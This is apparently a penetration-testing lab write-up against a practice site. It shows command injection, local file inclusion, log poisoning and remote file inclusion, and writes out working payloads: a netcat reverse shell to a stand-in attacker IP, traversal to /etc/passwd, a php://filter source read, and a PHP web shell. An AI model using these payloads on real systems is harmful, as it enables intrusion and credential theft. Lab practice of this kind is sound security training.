# 🔐 Command Injection & File Inclusion on pentest-ground.com:4280

📍 **Environment:** Kali Linux + Burp Suite + browser  
🎯 **Target:** `https://pentest-ground.com:4280/`  
🛠️ **Tools:** Burp Suite (Repeater, Proxy), Netcat, PHP filter wrappers, Curl

---

## 🎯 What I Did Today

### 1. Command Injection in Ping Utility
- Found a “Ping a host” feature that took a user-supplied IP address and executed a system `ping` command.
- Injected a semicolon and a command: `; id`. The server returned `uid=33(www-data) gid=33(www-data)` — confirmed command injection.
- Tested with `&& whoami`, `| ls`, and other operators to map OS and execution context.
- Escalated to a reverse shell using Netcat:
; nc -e /bin/sh ATTACKER_IP 4444

text
- On the listener, received a fully interactive shell as `www-data`.

### 2. Local File Inclusion (LFI)
- In the URL parameter `?page=`, attempted directory traversal: `?page=../../../../etc/passwd`.
- The contents of `/etc/passwd` appeared in the response — LFI confirmed.
- Used the `php://filter` wrapper to read source code without execution:
?page=php://filter/convert.base64-encode/resource=index.php

text
- Decoded the Base64 output to reveal the full PHP source, including database credentials.

### 3. Log Poisoning for RCE
- Sent a request to the server with a malicious User-Agent containing PHP code:
<?php system($_GET['cmd']); ?>
text
- Included the Apache access log via LFI: `?page=/var/log/apache2/access.log`.
- The log was parsed as PHP, and the injected shell executed. Called `?cmd=id` and got command output — full RCE via log poisoning.

### 4. Remote File Inclusion (RFI)
- Tested if the application would include a remote PHP file: `?page=http://ATTACKER_IP/shell.txt`.
- The remote shell executed (`<?php system($_GET['cmd']); ?>`), giving remote code execution.
- (If RFI failed) Observed that `allow_url_include=off` prevented remote inclusion; noted this for the report.

---

## 🧠 Key Findings

| Vulnerability | Parameter | Evidence | Impact |
|---------------|-----------|----------|--------|
| **Command Injection** | `ip` (ping utility) | `id` returned user info; reverse shell achieved | Full system access as `www-data` |
| **LFI** | `page` | Read `/etc/passwd` and source code of `index.php` | Sensitive data exposure, credential theft |
| **Log Poisoning** | User-Agent header | Injected PHP code executed via LFI on access log | Remote code execution |
| **RFI (if applicable)** | `page` | Included remote PHP shell | Remote code execution |

> 💡 **Core lesson:** Input that reaches a shell or file system is incredibly dangerous. Command injection and file inclusion are direct paths to the operating system — one forgotten sanitization can give an attacker the keys to the server.

---

## 📸 Proof of Work
